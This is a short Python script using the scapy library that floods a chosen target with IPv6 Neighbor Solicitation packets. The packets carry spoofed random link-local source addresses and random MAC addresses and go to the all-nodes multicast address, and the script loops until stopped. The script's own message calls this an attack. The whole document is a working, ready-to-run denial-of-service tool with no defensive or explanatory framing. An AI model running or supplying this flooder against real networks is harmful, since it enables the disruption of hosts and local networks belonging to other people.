#!/usr/bin/python
import random
from scapy.layers.inet6 import IPv6, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr
from scapy.sendrecv import send


def flood_NS():
    # Input
    interface = input(" - Insert the interface, if you skip this by Enter, the packet is automatically "
                      "sent on every active interface: ")
    tip = input(" - Insert the target host IPv6 address: ")
    print("Flooding the host" + tip + "with NS messages to force the answering of every NS (press Ctrl C to stop the "
                                      "attack)")
    # Generate packets
    while True:
        try:
            base = IPv6()
            base.dst = "ff02::1"
            M = 16 ** 4
            base.src = "fe80::dead:" + ":".join(("%x" % random.randint(0, M)
                                                 for j in range(4)))
            random_mac = "02:03:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                      random.randint(0, 255),
                                                      random.randint(0, 255))
            packet = base / ICMPv6ND_NS(tgt=tip) / \
                     ICMPv6NDOptSrcLLAddr(lladdr=random_mac)
            if interface == "":
                send(packet, verbose=False)
            else:
                send(packet, verbose=False, iface=interface)
        except KeyboardInterrupt:
            break

